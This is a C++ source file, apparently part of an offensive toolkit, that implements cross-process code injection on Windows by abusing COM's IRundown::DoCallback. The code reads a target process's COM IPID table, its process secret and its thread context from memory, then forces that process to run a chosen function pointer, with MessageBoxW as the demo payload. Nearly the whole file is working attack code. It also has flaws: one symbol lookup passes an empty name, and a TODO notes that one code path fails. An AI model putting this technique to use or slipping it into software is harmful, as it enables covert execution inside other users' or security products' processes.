#include "sysapi.h"
#include <comdef.h>
#include <guiddef.h>

#include <cstdio>
#include <vector>

#include "common.h"
#include "hash.h"
#include "pdb.h"
#include "scripts.h"

#include "rpc/rundown.h"


_COM_SMARTPTR_TYPEDEF(IRundown, __uuidof(IRundown));


const GUID GUID_NULL = { 0, 0, 0, { 0, 0, 0, 0, 0, 0, 0, 0 } };

struct tagPageEntry {
    tagPageEntry *pNext;
    unsigned int dwFlag;
};

struct CInternalPageAllocator {
    ULONG64            _cPages;
    tagPageEntry     **_pPageListStart;
    tagPageEntry     **_pPageListEnd;
    UINT               _dwFlags;
    tagPageEntry       _ListHead;
    UINT               _cEntries;
    ULONG64            _cbPerEntry;
    USHORT             _cEntriesPerPage;
    void              *_pLock;
};

// CPageAllocator CIPIDTable::_palloc structure in COM DLL
struct CPageAllocator {
    CInternalPageAllocator _pgalloc;
    PVOID                  _hHeap;
    ULONG64                _cbPerEntry;
    INT                    _lNumEntries;
};

enum IPIDFlags {
    IPIDF_CONNECTING = 0x1,
    IPIDF_DISCONNECTED = 0x2,
    IPIDF_SERVERENTRY = 0x4,
    IPIDF_NOPING = 0x8,
    IPIDF_COPY = 0x10,
    IPIDF_VACANT = 0x80,
    IPIDF_NONNDRSTUB = 0x100,
    IPIDF_NONNDRPROXY = 0x200,
    IPIDF_NOTIFYACT = 0x400,
    IPIDF_TRIED_ASYNC = 0x800,
    IPIDF_ASYNC_SERVER = 0x1000,
    IPIDF_DEACTIVATED = 0x2000,
    IPIDF_WEAKREFCACHE = 0x4000,
    IPIDF_STRONGREFCACHE = 0x8000,
    IPIDF_UNSECURECALLSALLOWED = 0x10000
};

typedef struct tagIPIDEntry {
    struct tagIPIDEntry* pNextIPID;      // next IPIDEntry for same object
    DWORD                dwFlags;        // flags (see IPIDFLAGS)
    ULONG                cStrongRefs;    // strong reference count
    ULONG                cWeakRefs;      // weak reference count
    ULONG                cPrivateRefs;   // private reference count
    void*                pv;             // real interface pointer
    IUnknown*            pStub;          // proxy or stub pointer
    void*                pOXIDEntry;     // ptr to OXIDEntry in OXID Table
    IPID                 ipid;           // interface pointer identifier
    IID                  iid;            // interface iid
    void*                pChnl;          // channel pointer
    void*                pIRCEntry;      // reference cache line
    HSTRING*             pInterfaceName;
    struct tagIPIDEntry* pOIDFLink;      // In use OID list
    struct tagIPIDEntry* pOIDBLink;
} IPIDEntry;

// IPID in IDL has GUID typedef
struct IPID_VALUES {
    WORD offset; // These are reversed because of little-endian
    WORD page;   // These are reversed because of little-endian
    WORD pid;
    WORD tid;
    BYTE seq[8];
};

typedef struct tagSOleTlsData {
    /* 0x0000 */ void* pvThreadBase;
    /* 0x0008 */ void* pSmAllocator;
    /* 0x0010 */ ULONG  dwApartmentID;
    /* 0x0014 */ ULONG  dwFlags;
    /* 0x0018 */ LONG   TlsMapIndex;
    /* 0x0020 */ void** ppTlsSlot;
    /* 0x0028 */ ULONG  cComInits;
    /* 0x002c */ ULONG  cOleInits;
    /* 0x0030 */ ULONG  cCalls;
    /* 0x0038 */ void* pServerCall;
    /* 0x0040 */ void* pCallObjectCache;
    /* 0x0048 */ void* pContextStack;
    /* 0x0050 */ void* pObjServer;
    /* 0x0058 */ ULONG  dwTIDCaller;
    /* 0x0060 */ void* pCurrentCtxForNefariousReaders;
    /* 0x0068 */ void* pCurrentContext;
} SOleTlsData;


namespace scripts {

struct ipid_entry_t {
    IID iid;
    IPID ipid;
    OXID oxid;
    OID oid;
};


IRundownPtr
ConnectToIRundown(OID oid, OXID oxid, IPID ipid) {

    OBJREF objRef = { 0 };

    objRef.signature = OBJREF_SIGNATURE;
    objRef.flags = OBJREF_STANDARD;
    objRef.iid = IID_IRundown;

    objRef.u_objref.u_standard.std.flags = 0;
    objRef.u_objref.u_standard.std.cPublicRefs = 1;

    objRef.u_objref.u_standard.std.oid = oid;
    objRef.u_objref.u_standard.std.oxid = oxid;
    objRef.u_objref.u_standard.std.ipid = ipid;

    objRef.u_objref.u_standard.saResAddr.wNumEntries = 0;
    objRef.u_objref.u_standard.saResAddr.wSecurityOffset = 0;

    auto objreg_base64 = str::to_wstring(hash::base64::encode(&objRef, sizeof(objRef)));\
    auto name = std::format(L"OBJREF:{}:", objreg_base64);

    IRundownPtr irundown;
    HRESULT hr = CoGetObject(name.c_str(), NULL, IID_IRundown, (void**)&irundown);

    if (FAILED(hr)) {
        wprintf(L"  [-] unable to create IRundown object, HRESULT = 0x%x\n", hr);
    }

    return irundown;
}

bool inject_com_irundown_docallback(uint32_t pid, RemoteProcessMemoryMethod method) {

    wprintf(L"\nOpening the target process\n");
    sysapi::unique_handle ProcessHandle = sysapi::ProcessOpen(pid);
    if (ProcessHandle == NULL) {
        return false;
    }

    wprintf(L"  [+] process opened, HANDLE = 0x%p\n", ProcessHandle.get());

    bool is_64;
    bool res = sysapi::ProcessGetWow64Info(ProcessHandle.get(), is_64);
    if (!res) {
        return false;
    }

    wprintf(L"\nResolving and reading COM DLL structs...\n");

    wchar_t folder_path[MAX_PATH];
    GetTempPathW(MAX_PATH, folder_path);

    auto *combase_module = (PVOID)GetModuleHandleA("combase");

    auto combase_pdb_path = pdb::download_pdb(combase_module, folder_path);
    if (combase_pdb_path.empty()) {
        wprintf(L"  [-] unable download PDB for combase module");
        return false;
    }

    size_t ole32_secret_rva = pdb::get_symbol_rva(combase_pdb_path, L"CProcessSecret::s_guidOle32Secret");
    if (ole32_secret_rva == 0) {
        wprintf(L"  [-] unable to get RVA of CProcessSecret::s_guidOle32Secret");
        return false;
    }

    wprintf(L"  [+] RVA of CProcessSecret::s_guidOle32Secret = 0x%zx\n", ole32_secret_rva);

    size_t ole32_palloc_rva = pdb::get_symbol_rva(combase_pdb_path, L"CIPIDTable::_palloc");
    if (ole32_palloc_rva == 0) {
        wprintf(L"  [-] unable to get RVA of CIPIDTable::_palloc");
        return false;
    }

    wprintf(L"  [+] RVA of CIPIDTable::_palloc = 0x%zx\n", ole32_palloc_rva);

    size_t ole32_emptyctx_rva = pdb::get_symbol_rva(combase_pdb_path, L"");
    if (ole32_emptyctx_rva == 0) {
        wprintf(L"  [-] unable to get RVA of g_pMTAEmptyCtx");
        return false;
    }

    wprintf(L"  [+] RVA of g_pMTAEmptyCtx = 0x%zx\n", ole32_emptyctx_rva);

    size_t moxid_offset = pdb::get_field_offset(combase_pdb_path, L"OXIDEntry", L"_moxid");
    if (moxid_offset == 0) {
        wprintf(L"  [-] unable to get offset of _moxid field in OXIDEntry\n");
        return false;
    }

    wprintf(L"  [+] offset of OXIDEntry::_moxid field = 0x%zx\n", moxid_offset);

    RemoteProcessMemoryContext ctx;
    ctx.method = method;
    ctx.ProcessHandle = ProcessHandle.get();

    ctx.Size = (ULONG)sizeof(CPageAllocator);

    CPageAllocator palloc;
    res = process_read_memory(ctx, (size_t)PTR_ADD(combase_module, ole32_palloc_rva), &palloc, sizeof(CPageAllocator));
    if (!res) {
        return false;
    }

    size_t pages_cnt = palloc._pgalloc._cPages;
    size_t pages_size = pages_cnt * sizeof(ULONG_PTR);

    unique_c_mem<ULONG_PTR> Pages;
    res = Pages.allocate(pages_cnt);
    if (!res) {
        return false;
    }

    ctx.Size = (ULONG)pages_size;
    res = process_read_memory(ctx, (size_t)palloc._pgalloc._pPageListStart, Pages.data(), pages_size);
    if (!res) {
        return false;
    }

    size_t ipid_cnt = palloc._pgalloc._cEntriesPerPage;
    size_t ipid_size = ipid_cnt * sizeof(IPIDEntry);

    unique_c_mem<IPIDEntry> IPIDEntries;
    res = IPIDEntries.allocate(ipid_cnt);
    if (!res) {
        return false;
    }

    wprintf(L"\nLooking for valid IPID entries with IID_IRundown...\n");

    std::vector<ipid_entry_t> ipid_entries;

    for (size_t i = 0; i < pages_cnt; i++) {

        ctx.Size = (ULONG)ipid_size;
        res = process_read_memory(ctx, (size_t)Pages[i], IPIDEntries.data(), ipid_size);
        if (!res) {
            return false;
        }

        for (size_t j = 0; j < ipid_cnt; j++) {

            if (!IPIDEntries[j].pOXIDEntry || !IPIDEntries[j].dwFlags) continue;
            if (IPIDEntries[j].dwFlags & (IPIDF_DISCONNECTED | IPIDF_DEACTIVATED)) continue;

            if (IPIDEntries[j].iid != IID_IRundown) continue;

            struct {
                OXID oxid;
                OID oid;
            } oxid_oid;

            ctx.Size = sizeof(oxid_oid);
            res = process_read_memory(ctx, (size_t)PTR_ADD(IPIDEntries[j].pOXIDEntry, moxid_offset), &oxid_oid, sizeof(oxid_oid));
            if (!res) {
                continue;
            }

            if (!oxid_oid.oxid || !oxid_oid.oid) continue;

            ipid_entry_t ipid_entry;
            ipid_entry.iid = IPIDEntries[j].iid;
            ipid_entry.ipid = IPIDEntries[j].ipid;
            ipid_entry.oxid = oxid_oid.oxid;
            ipid_entry.oid = oxid_oid.oid;

            wprintf(L"  [+] valid entry found, OXID = 0x%zx, IPID = %s\n",
                    ipid_entry.oxid,
                    str::to_wstring(ipid_entry.ipid).c_str()
            );

            ipid_entries.push_back(ipid_entry);
        }
    }

    wprintf(L"\nProcessing IPID entries and invoking IRundown::DoCallback()...\n");

    // memoized stuff
    GUID Ole32Secret = IID_NULL;
    PVOID GlobalCtxAddr = NULL;

    for (const auto& ipid_entry : ipid_entries) {

        uint32_t tid = ((IPID_VALUES*)&ipid_entry.ipid)->tid;
        bool valid_tid = tid && tid != UINT16_MAX;

        wprintf(L"  [*] binding to OXID = 0x%zx, IPID = %s with %s COM context...\n",
            ipid_entry.oxid,
            str::to_wstring(ipid_entry.ipid).c_str(),
            valid_tid ? L"thread" : L"global"
        );

        auto irundown = ConnectToIRundown(ipid_entry.oid, ipid_entry.oxid, ipid_entry.ipid);
        if (!irundown) {
            continue;
        }

        PVOID server_ctx_addr = NULL;

        if (valid_tid) {

            sysapi::unique_handle target_thread = sysapi::ThreadOpen(pid, tid, THREAD_QUERY_INFORMATION);
            if (target_thread == NULL) {
                continue;
            }

            THREAD_BASIC_INFORMATION BasicInfo;
            res = sysapi::ThreadGetBasicInfo(target_thread.get(), BasicInfo);
            if (!res) {
                continue;
            }

            PVOID OleAddr;

            ctx.Size = (ULONG)sizeof(PVOID);
            res = process_read_memory(ctx, (size_t)PTR_ADD(BasicInfo.TebBaseAddress, offsetof(TEB, ReservedForOle)), &OleAddr, sizeof(PVOID));
            if (!res) {
                continue;
            }

            SOleTlsData oleTlsData;

            ctx.Size = (ULONG)sizeof(SOleTlsData);
            res = process_read_memory(ctx, (size_t)OleAddr, &oleTlsData, sizeof(SOleTlsData));
            if (!res) {
                continue;
            }

            server_ctx_addr = oleTlsData.pCurrentContext;
        }

        if (server_ctx_addr == NULL) {

            if (GlobalCtxAddr == NULL) {

                ctx.Size = (ULONG)sizeof(PVOID);
                res = process_read_memory(ctx, (size_t)PTR_ADD(combase_module, ole32_emptyctx_rva), &GlobalCtxAddr, sizeof(PVOID));
                if (!res) {
                    return false;
                }

                wprintf(L"  [ ] g_pMTAEmptyCtx addr = 0x%p\n", GlobalCtxAddr);
            }

            server_ctx_addr = GlobalCtxAddr;
            // TODO: fix IRundown::DoCallback() error RPC_E_SERVERFAULT with global ctx
        }

        XAptCallback params = { 0 };
        params.pServerCtx = (DWORD64)server_ctx_addr;
        params.pfnCallback = (DWORD64)MessageBoxW;
        params.pParam = (DWORD64)0;

        ctx.Size = (ULONG)sizeof(GUID);

        if (Ole32Secret == IID_NULL) {

            res = process_read_memory(ctx, (size_t)PTR_ADD(combase_module, ole32_secret_rva), &Ole32Secret, sizeof(Ole32Secret));
            if (!res) {
                return false;
            }

            if (Ole32Secret == IID_NULL) {

                wprintf(L"  [*] CProcessSecret::s_guidOle32Secret = %s, invoking IRundown::DoCallback() with invalid secret to init...\n", str::to_wstring(Ole32Secret).c_str());
                irundown->DoCallback(&params);

                res = process_read_memory(ctx, (size_t)PTR_ADD(combase_module, ole32_secret_rva), &Ole32Secret, sizeof(Ole32Secret));
                if (!res) {
                    return false;
                }
            }

            wprintf(L"  [ ] CProcessSecret::s_guidOle32Secret = %s\n", str::to_wstring(Ole32Secret).c_str());
        }

        params.guidProcessSecret = Ole32Secret;

        HRESULT hr = irundown->DoCallback(&params);
        if (FAILED(hr)) {
            wprintf(L"  [-] IRundown::DoCallback() error, HRESULT = 0x%x\n", hr);
            continue;
        }

        wprintf(L"  [+] IRundown::DoCallback() success\n");
        wprintf(L"\nSuccess\n");
        return true;
    }

    wprintf(L"\nError\n");
    return false;
}

}